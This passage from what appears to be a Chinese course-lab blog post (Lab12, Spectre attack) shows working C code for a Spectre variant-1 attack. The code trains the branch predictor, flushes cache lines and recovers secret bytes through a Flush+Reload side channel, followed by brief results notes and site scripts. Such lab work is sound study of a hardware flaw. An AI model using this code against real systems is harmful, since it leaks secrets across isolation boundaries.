*/</span><br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spectreAttack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> larger_x)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> z;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>    _mm_clflush(&amp;buffer_size);<br>    <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++) &#123; &#125;<br>    restrictedAccess(i);  <br>  &#125;<br>  <span class="hljs-comment">// Flush buffer_size and array[] from the cache.</span><br>  _mm_clflush(&amp;buffer_size);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-comment">// Ask victim() to return the secret in out-of-order execution.</span><br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++) &#123; &#125;<br>  s = restrictedAccess(larger_x);<br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x&lt;<span class="hljs-number">17</span>; x++)<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(scores, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(scores));<br>    <span class="hljs-type">size_t</span> larger_x = (<span class="hljs-type">size_t</span>)(secret-(<span class="hljs-type">char</span>*)buffer + x);<br>    flushSideChannel();<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>; i++) scores[i]=<span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>      spectreAttack(larger_x);<br>      reloadSideChannelImproved();<br>    &#125;<br>    <span class="hljs-type">int</span> max = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>     <span class="hljs-keyword">if</span>(scores[max] &lt; scores[i])  <br>       max = i;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading secret value at %p = &quot;</span>, (<span class="hljs-type">void</span>*)larger_x);<br>    usleep(<span class="hljs-number">50</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The  secret value is %d \t %c\n&quot;</span>, max,max);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>2、编译运行task6.c，刚开始时得到的字符较少，运行到第8次时得到只缺失第一个字符的字符串。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.22.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>3、修改睡眠时间为70，运行第5次得到只缺失第一个字符的字符串，第一个字符仍无法获取。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.23.jpg" srcset="/img/loading.gif" lazyload class="">
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AF%BE%E7%A8%8B%E5%AE%9E%E9%AA%8C/" class="category-chain-item">网络攻防课程实验</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/" title="web入门-sql注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">web入门-sql注入</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/" title="Lab11-DNS欺骗-Remote">
+                        <span class="hidden-mobile">Lab11-DNS欺骗-Remote</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
